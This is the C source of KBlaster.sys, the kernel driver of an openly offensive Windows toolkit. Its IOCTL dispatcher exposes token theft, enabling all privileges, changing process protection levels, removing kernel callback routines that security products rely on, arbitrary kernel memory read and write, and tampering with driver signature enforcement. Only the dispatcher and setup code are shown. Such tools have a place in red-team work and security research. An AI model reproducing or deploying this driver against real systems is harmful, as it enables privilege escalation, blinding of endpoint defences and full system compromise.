/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlaster.sys ( driver )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlaster.hpp"


UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\KBlaster");
UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\KBlaster");


NTSTATUS KBlaster_k_IOCTLDispatchar(PDEVICE_OBJECT pDeviceObject, PIRP pIRP)
{
	UNREFERENCED_PARAMETER(pDeviceObject);
	NTSTATUS status = 0;
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIRP);
	PKBLAST_BUFFER pUserlandGenericParams = 0;
	PKBLAST_MEMORY_BUFFER pUserlandMemoryParams = 0;
	
	ULONG length = 0;
	ULONG outLength = stack->Parameters.DeviceIoControl.OutputBufferLength;

	pUserlandGenericParams = (PKBLAST_BUFFER)stack->Parameters.DeviceIoControl.Type3InputBuffer;
	pUserlandMemoryParams = (PKBLAST_MEMORY_BUFFER)stack->Parameters.DeviceIoControl.Type3InputBuffer;
	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case KBLASTER_IOCTL_BUG_CHECK:
		KeBugCheck(MANUALLY_INITIATED_CRASH);
		break;

	case KBLASTER_IOCTL_PROTECT_WINTCB:
		status = KBlaster_k_ProcessProtection(pUserlandGenericParams->integer1, PROTECTION_WINTCB);
		break;

	case KBLASTER_IOCTL_PROTECT_LSA:
		status = KBlaster_k_ProcessProtection(pUserlandGenericParams->integer1, PROTECTION_LSA);
		break;

	case KBLASTER_IOCTL_PROTECT_ANTIMALWARE:
		status = KBlaster_k_ProcessProtection(pUserlandGenericParams->integer1, PROTECTION_ANTIMALWARE);
		break;

	case KBLASTER_IOCTL_PROTECT_NONE:
		status = KBlaster_k_ProcessProtection(pUserlandGenericParams->integer1, PROTECTION_NONE);
		break;

	case KBLASTER_IOCTL_TOKEN_PRIVILEGES_ENABLEALL:
		status = KBlaster_k_TokenPrivilegeManipulate(pUserlandGenericParams->integer1, PRIVILEGES_ENABLEALL);
		break;

	case KBLASTER_IOCTL_TOKEN_PRIVILEGES_DISABLEALL:
		status = KBlaster_k_TokenPrivilegeManipulate(pUserlandGenericParams->integer1, PRIVILEGES_DISABLEALL);
		break;

	case KBLASTER_IOCTL_TOKEN_STEAL:
		status = KBlaster_k_TokenContextSteal(pUserlandGenericParams->integer1, pUserlandGenericParams->integer2);
		break;

	case KBLASTER_IOCTL_TOKEN_RESTORE:
		status = KBlaster_k_TokenContextRestore(pUserlandGenericParams->integer1);
		break;

	case KBLASTER_IOCTL_CALLBACK_PROCESS_LIST:
		status = KBlaster_k_EnumProcessCallbacks(outLength, ARRAY_PROCESS, pIRP->UserBuffer);
		break;

	case KBLASTER_IOCTL_CALLBACK_THREAD_LIST:
		status = KBlaster_k_EnumProcessCallbacks(outLength, ARRAY_THREAD, pIRP->UserBuffer);
		break;

	case KBLASTER_IOCTL_CALLBACK_IMAGE_LIST:
		status = KBlaster_k_EnumProcessCallbacks(outLength, ARRAY_IMAGE, pIRP->UserBuffer);
		break;

	case KBLASTER_IOCTL_CALLBACK_REGISTRY_LIST:
		status = KBlaster_k_EnumProcessCallbacks(outLength, LISTENTRY_REGISTRY, pIRP->UserBuffer);
		break;

	case KBLASTER_IOCTL_CALLBACK_PROCESS_REMOVE:
		status = KBlaster_k_RemoveCallbackRoutine(pUserlandGenericParams->pointer, ARRAY_PROCESS);
		break;

	case KBLASTER_IOCTL_CALLBACK_THREAD_REMOVE:
		status = KBlaster_k_RemoveCallbackRoutine(pUserlandGenericParams->pointer, ARRAY_THREAD);
		break;

	case KBLASTER_IOCTL_CALLBACK_IMAGE_REMOVE:
		status = KBlaster_k_RemoveCallbackRoutine(pUserlandGenericParams->pointer, ARRAY_IMAGE);
		break;

	case KBLASTER_IOCTL_CALLBACK_REGISTRY_REMOVE:
		status = KBlaster_k_RemoveCallbackRoutine(pUserlandGenericParams->pointer, LISTENTRY_REGISTRY);
		break;

	case KBLASTER_IOCTL_MEMORY_WRITE:
		status = KBlaser_k_memory_manage(pUserlandMemoryParams, NULL, MEMORY_WRITE);
		break;

	case KBLASTER_IOCTL_MEMORY_READ:
		status = KBlaser_k_memory_manage(pUserlandMemoryParams, pIRP->UserBuffer, MEMORY_READ);
		break;

	case KBLASTER_IOCTL_DSE:
		status = KBlaster_k_memory_dse(pUserlandGenericParams->uGeneric, pIRP->UserBuffer);
		break;

	default:
		break;
	}

	length = outLength;
	pIRP->IoStatus.Information = length;
	pIRP->IoStatus.Status = status;
	IoCompleteRequest(pIRP, IO_NO_INCREMENT);

	return STATUS_SUCCESS;

}


NTSTATUS KBlaster_k_CreateClose(PDEVICE_OBJECT pDeviceObject, PIRP pIRP)
{
	UNREFERENCED_PARAMETER(pDeviceObject);
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIRP);

	switch (stack->MajorFunction)
	{
	case IRP_MJ_CREATE:
		break;

	case IRP_MJ_CLOSE:
		break;

	default:
		break;
	}

	pIRP->IoStatus.Information = 0;
	pIRP->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(pIRP, IO_NO_INCREMENT);

	return STATUS_SUCCESS;

}



void KBlaster_k_DriverCleanup(PDRIVER_OBJECT DriverObject)
{
	IoDeleteDevice(DriverObject->DeviceObject);
	IoDeleteSymbolicLink(&symlink);
}




NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS status = STATUS_NOT_SUPPORTED;
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = KBlaster_k_DriverCleanup;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = KBlaster_k_CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = KBlaster_k_CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KBlaster_k_IOCTLDispatchar;

	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DriverObject->DeviceObject);
	if (NT_SUCCESS(status))
	{
		status = IoCreateSymbolicLink(&symlink, &deviceName);
		if (NT_SUCCESS(status))
		{
			status = AuxKlibInitialize();
			if (NT_SUCCESS(status))
			{
				if (KBlaster_k_utils_GetWindowsVersion() != WINDOWS_UNSUPPORTED)
				{
					status = STATUS_SUCCESS;
				}
				else
				{
					status = STATUS_NOT_SUPPORTED;
				}
			}
		}
	}

	return status;

}